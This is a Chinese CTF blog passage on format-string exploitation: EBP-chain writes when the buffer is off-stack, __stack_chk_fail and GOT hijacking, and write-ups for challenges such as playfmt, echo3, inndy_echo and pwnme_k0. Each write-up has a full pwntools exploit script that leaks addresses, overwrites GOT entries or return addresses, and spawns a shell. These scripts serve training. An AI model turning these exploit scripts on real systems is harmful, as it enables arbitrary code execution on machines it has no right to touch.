printf家族的其他函数首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。 fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用 sprintf：可以用%xxc 来造成新的buffer overflow 劫持__stack_chk_fail 在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改__stack_chk_fail 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址 在只有一次 stack overflow+fmt 时可以将__stack_chk_fail改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。 格式化字符串不在栈上有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在 stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。 EBP链 正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后 通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。 改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。 简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，在这个过程当中一定要学会对栈上的已有数据的灵活的运用。 接下来看一个题来仔细分析一下 hitcontraining-playfmt保护和archArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 没有任何保护。 ida分析int do_fmt() &#123; int result; // eax while ( 1 ) &#123; read(0, buf, 0xC8u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); &#125; return result; &#125; 其中看到buf在bss段：这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。 上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。 攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。 gdb调试定位到printf函数处： gdb-peda$ b *0x0804854F Breakpoint 1 at 0x804854f 可以看一下此时的栈情况：esp寄存器：这里就把0xffffd338叫做ebp3，0xffffd348为ebp2，0xffffd358为ebp1。 第一次修改：对ebp2使用%xxhhn修改ebp1为do-fmt函数的retaddr 0xffffd33c的栈指针（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来） 第二次修改 ： 对ebp1使用%xxhn 修改retaddr 0x80485ad 为你在buf处提前摆上的shellcode 这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。 expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./ebp') # io = remote('node3.buuoj.cn',29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input('-&gt;') io.sendline('%4$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = '%&#123;&#125;c%4$hhn'.format(key1) raw_input('-&gt;') io.sendline(payload) io.recv() payload = '%&#123;&#125;c%12$hn'.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() 这个题目就是很单纯的直接利用ebp链进行攻击即可。 然后再看一个有点不一样的题目： inndy-echo3保护和archArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析 这一处会让栈结构的情况变得无法预测。然后进入hardfmt： for ( i = 0; i &lt;= 4; ++i ) &#123; read(0, buff, 0x1000u); printf(buff); &#125; 这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：改printf的got表，然后在第5次传过去/bin/sh即可。（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做） gdb分析定位到漏洞printf函数处：会发现这个情况是没有构成ebp链的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。 因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。 我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ： 泄漏libc基址，计算出system的内存地址。 在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016） 在构造的got地址上，开始写system地址由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。 如上图所示，很简单就可以泄漏出libc基址。但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。 此时注意图上前两个红框，可以发现把前二个红框虽不是ebp的链，但是这也是成一个链可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针： 这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的： gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60 这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。 接着就可以构造got地址和got+2地址： gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 然后就可以利用对got地址和got+2地址使用%xhn,写system的内存地址上printf的got了： 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc) 写好以后，再传过去一下/bin/sh即可。 expfrom pwn import * context.log_level = 'debug' context.arch ='i386' import time elf = ELF('./echo3') debug = 1 while True: if debug : io = process('./echo3') libc = elf.libc else: io = remote('node3.buuoj.cn',25057) libc = ELF('./libc-2.23.so.i386') payload = '%43$pA%30$pA%47$p' io.sendline(payload) address = io.recvline().strip() if address[-3:] == '637': if address[7:10] == '637': libc_base = int(address[2:10],16) - 247 - libc.symbols['__libc_start_main'] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols['system'] print('system_addr -&gt;' + hex(system_addr)) print('tag1_stack_point -&gt;' + hex(tag1_stack_point)) print('tag2_stack_point -&gt;' + hex(tag2_stack_point)) break else : io.close() continue def fmtshort(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result def fmtbyte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info('--------change the two points to tag_stack_point:-------') # raw_input('-&gt;') prev = 0 payload = \"\" for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + '1111' io.sendline(payload) io.recvuntil('1111') info('--------change got_table to printf_got:-------') prev = 0 payload = \"\" key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + '2222' io.sendline(payload) io.recvuntil('2222') info('--------change printf_got to system_addr:-------') raw_input('-&gt;') prev = 0 payload = \"\" key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print('key5 -&gt; ' + hex(key5)) print('key6 -&gt; ' + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + '3333' io.sendline(payload) sleep(1) io.recvuntil('3333') raw_input('&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;') io.sendline('/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00') io.interactive() 这个exp的难点在于： 注意去定位到合适的栈结构再去利用 尽量充分利用每一次的printf 单次printf多次写入 注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。 小总结通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会灵活、充分的利用栈上的数据,单纯的ebp链只是适合简单的情况。 但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是针对性程序本身的，基本不会受到libc版本的影响，用起来很好用，要优先考虑。 还有就是面对这种会有随机栈情况、没有ebp链的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"格式化字符串漏洞题目练习","slug":"格式化字符串漏洞题目练习","date":"2020-03-15T06:38:15.000Z","updated":"2020-06-26T03:43:20.333Z","comments":true,"path":"2020/03/15/格式化字符串漏洞题目练习/","link":"","permalink":"http://chumen77.xyz/2020/03/15/格式化字符串漏洞题目练习/","excerpt":"","text":"格式化字符串漏洞题目练习前言整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。 inndy_echo保护和arch[*] '/media/psf/mypwn2/buuctf/inndy_echo/echo' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析int __cdecl __noreturn main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; 可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去/bin/sh，此时就会变成system(/bin/sh) gdb调试gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (\"AAAA\\n\") 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (\"__libc_start_main\") 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (\"AAAA\\n\") gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (\"\\%6$p\") 确定偏移是7，打算一会写payload时候需要补齐，就.ljust补成0x20的，也就是offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,'a') + p32(printf_got) + p32(printf_got+2) raw_input('-&gt;') io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() 换一种就是用pwntools模块，面对32位，这种情况还是很好用的： from pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,&#123;printf_got : system_plt&#125;) io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() [DEBUG] Sent 0x3c bytes: 00000000 10 a0 04 08 11 a0 04 08 12 a0 04 08 13 a0 04 08 │····│····│····│····│ 00000010 25 32 34 30 63 25 37 24 68 68 6e 25 31 33 32 63 │%240│c%7$│hhn%│132c│ 00000020 25 38 24 68 68 6e 25 31 32 38 63 25 39 24 68 68 │%8$h│hn%1│28c%│9$hh│ 00000030 6e 25 34 63 25 31 30 24 68 68 6e 0a │n%4c│%10$│hhn·││ 0000003c 可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。 jarvisoj_fmida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(\"%d!\\n\", *(_DWORD *)&amp;x); if ( *(_DWORD *)&amp;x != 4 ) return 0; puts(\"running sh...\"); system(\"/bin/sh\"); return 0; &#125; 十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。 expfrom pwn import * context.log_level = 'debug' # io = process('./fm') io = remote('node3.buuoj.cn',26915) # io.recv() payload = p32(0x0804A02C) + '%11$hn' raw_input('-&gt;') io.sendline(payload) io.interactive() winesap_week6源码：#include &lt;stdio.h&gt; int main() &#123; setvbuf(stdout, 0, _IONBF, 0); alarm(180); char str[100]; while(gets(str)) &#123; printf(str); &#125; return 0; &#125; 需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。 EXPfrom pwn import * import time context.arch = 'amd64' context.log_level = 'debug' io = process('./fmt1') elf = ELF('./fmt1') libc = elf.libc printf_got = 0x0000601020 io.sendline('%21$p') io.recvuntil('0x') libc_base = int((io.recv(12)),16) - 240 -libc.symbols['__libc_start_main'] system_addr = libc_base + libc.symbols['system'] print('leak_libc_base: ' + hex(libc_base)) print('system_addr: ' + hex(system_addr)) def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = system_addr for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x30,'a') + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4) io.sendline(payload) sleep(1) io.sendline('/bin/sh\\x00') io.interactive() HITCON-Training-lab8源码#include &lt;stdio.h&gt; int magic = 0 ; int main()&#123; char buf[0x100]; setvbuf(stdout,0,2,0); puts(\"Please crax me !\"); printf(\"Give me magic :\"); read(0,buf,0x100); printf(buf); if(magic == 0xda)&#123; system(\"cat /home/craxme/flag\"); &#125;else if(magic == 0xfaceb00c)&#123; system(\"cat /home/craxme/craxflag\"); &#125;else&#123; puts(\"You need be a phd\"); &#125; &#125; 编译为64位。 分析（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入/bin/sh即可。 expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./craxme') # io = remote('127.0.0.1',8888) magic = 0x0000060106C io.recvuntil(':') system_plt = 0x04005A0 puts_got = 0x0601018 ret_addr = 0x00400747 printf_got = 0x00601030 key = 0x00400747 key2 = 0x04005A0 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" for i in range(3): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key &gt;&gt; i*16) &amp; 0xffff for i in range(3): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x80+0x20,'a') + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4]) io.sendline(payload) io.interactive() cacti-pwn3保护和arch[*] '/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析这个题模拟了一个ftp服务。这里控制的是登陆。进入分析一下： char *__cdecl ask_username(char *dest) &#123; char src[40]; // [esp+14h] [ebp-34h] int i; // [esp+3Ch] [ebp-Ch] puts(\"Connected to ftp.hacker.server\"); puts(\"220 Serv-U FTP Server v6.4 for WinSock ready...\"); printf(\"Name (ftp.hacker.server:Rainism):\"); __isoc99_scanf(\"%40s\", src); for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i ) ++src[i]; return strcpy(dest, src); &#125; 用户名函数，发现对你输入的东西进行诸位的进行加一。 int __cdecl ask_password(char *s1) &#123; if ( !strcmp(s1, \"sysbdmin\") ) return puts(\"welcome!\"); puts(\"who you are?\"); exit(1); return puts(\"welcome!\"); &#125; 用户密码函数，发现要跟sysbdmin 进行对比，如果不相等，就直接退出。(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）所以这个绕过就时sysbdmin 诸位减1即可。剩下的就是输入get put dir,会进入不同的分支，其中输入get函数： int get_file() &#123; char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &amp;s1); if ( !strncmp(&amp;s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) &#123; if ( !strcmp(i, &amp;s1) ) &#123; strcpy(&amp;dest, i + 40); return printf(&amp;dest); &#125; &#125; return printf(&amp;dest); &#125; 这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了： 由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。 修改puts函数的got为system的地址，然后记得这个文件的名称是/bin/sh,这样在使用dir调用puts函数时，就可以拿到shell了。这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' io = process('./pwn3') elf = ELF('./pwn3') libc = elf.libc s = 'sysbdmin' key = '' for i in s: key+=chr(ord(i)-1) print(key) io.sendline(key) info('---------leak libc_base--------') io.recvuntil('&gt;') io.sendline('put') io.recvuntil('upload:') io.sendline('1111') puts_got = elf.got['puts'] io.sendline('%8$s' + p32(puts_got) ) io.recvuntil('&gt;') io.sendline('get') io.recvuntil('get:') io.sendline('1111') puts_addr = u32(io.recv(4)[:4]) print('puts_add:' + hex(puts_addr)) sys_addr = puts_addr - libc.symbols['puts'] + libc.symbols['system'] io.recvuntil('&gt;') info('---------hijack puts_got--------') io.sendline('put') io.recvuntil('upload:') io.sendline('/bin/sh;') payload = fmtstr_payload(7,&#123;puts_got: sys_addr&#125;) io.sendline(payload) io.recvuntil('&gt;') io.sendline('get') io.recvuntil('get:') info('--------- get shell-------') io.sendline('/bin/sh;') io.recvuntil('&gt;') io.sendline('dir') io.interactive() 三个白帽 - pwnme_k0保护和arch[*] '/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 开启了RELRO，这样就无法修改got了。 ida分析程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞： int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) &#123; write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&amp;formata, \"Welc0me to sangebaimao!\\n\"); return printf(&amp;a9 + 4); &#125; 其中发现其输出的buf就是你输入的密码：并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。Gdb调试定位关键在这个printf当中，确定一下： 看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。 expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./pwnme_k0') # context.clear(arch = 'amd64') io.recvuntil('lenth:20): \\n') io.sendline('%0006$lx') io.recvuntil('lenth:20): \\n') io.sendline('11111111') io.recvuntil('&gt;') io.sendline('1') # io.recvuntil('Welc0me to sangebaimao!\\n') stack = int(io.recvline_contains('7f'),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = '%2218c%8$hn' io.recvuntil('&gt;') io.sendline('2') io.recvuntil('lenth:20): \\n') io.sendline(p64(ret_add)) io.recvuntil('lenth:20): \\n') io.sendline(payload) io.recvuntil('&gt;') io.sendline('1') io.interactive() inndy-echo2保护和arch[*] '/media/psf/mypwn2/buuctf/inndy_echo2/echo2' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。 ida分析void __noreturn echo() &#123; char s; // [rsp+0h] [rbp-110h] unsigned __int64 v1; // [rsp+108h] [rbp-8h] v1 = __readfsqword(0x28u); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s, 256LL); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; 代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。 gdb 调试=&gt; 0x555555554984 &lt;echo+68&gt;: call 0x5555555547a0 &lt;printf@plt&gt; 0x555555554989 &lt;echo+73&gt;: lea rax,[rbp-0x110] 0x555555554990 &lt;echo+80&gt;: lea rsi,[rip+0xfd] # 0x555555554a94 0x555555554997 &lt;echo+87&gt;: mov rdi,rax 0x55555555499a &lt;echo+90&gt;: call 0x5555555547d0 &lt;strcmp@plt&gt; 找到关键点，然后看一下栈情况： 0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 --More--(25/48) 0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;: cmp eax,0xffffffff) 0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 0216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700) 0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;: xor ebp,ebp) 0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;: test rax,rax) 0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087 发现在0x7fffffffe1e0这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的plt和got地址。 expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./echo2') # io = remote('node3.buuoj.cn',28200) def leak1(): io.sendline('%34$p') io.recvuntil('0x') p_bass_addr = int((io.recv(9)+'000'),16) return p_bass_addr p_bass_addr = leak1() print('p_bass_addr -&gt;' + hex(p_bass_addr)) print_got = 0x201020 + p_bass_addr print('print_got -&gt;' + hex(print_got)) system_plt = 0x790 + p_bass_addr print('system_plt -&gt;' + hex(system_plt)) def fmt(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = system_plt for i in range(3): payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x40,'a') + flat([print_got,print_got+2,print_got+4]) # raw_input('-&gt;') io.sendline(payload) sleep(0.1) io.sendline('/bin/sh\\x00') io.interactive() -— ** 接下来的题，都是buf不再栈的上的题目。** plaidctf2015-ebp保护和arch[*] '/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看到nx保护是关闭的，可以想办法利用shellcode。 ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; int result; // eax while ( 1 ) &#123; result = (int)fgets(buf, 1024, stdin); if ( !result ) break; echo(); &#125; return result; &#125; 漏洞函数： int make_response() &#123; return snprintf(response, 0x400u, buf); &#125; 代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。 gdb调试gdb-peda$ stack 0x20 0000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x0 0004| 0xffffd324 --&gt; 0x400 0008| 0xffffd328 --&gt; 0x804a080 (\"AAAA\\n\") 0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f 0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;: add esi,0x15815) 0020| 0xffffd334 --&gt; 0x0 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ： 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0 也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用%xc%4$hhn 就可以修改0xffffd378（ebp3）。将0xffffd378 改为指向ret address的栈地址 0xffffd33c ： 0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;: mov DWORD PTR [esp],0x804a480) 改完也就是这样的效果。这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用%xc%y$hhn 就可以修改0x804852c（ret address） 这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。 expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./ebp') # io = remote('node3.buuoj.cn',29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input('-&gt;') io.sendline('%4$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = '%&#123;&#125;c%4$hhn'.format(key1) raw_input('-&gt;') io.sendline(payload) io.recv() payload = '%&#123;&#125;c%12$hn'.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() hitcontraining-playfmt保护和arch[*] '/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 没有任何保护。 ida分析int do_fmt() &#123; int result; // eax while ( 1 ) &#123; read(0, buf, 0xC8u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); &#125; return result; &#125; 上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。 攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。 gdb分析 如图所示，利用这个链即可。先想办法把Oxffffd358 改成 Oxffffd33c : 然后在想办法把0x8048507 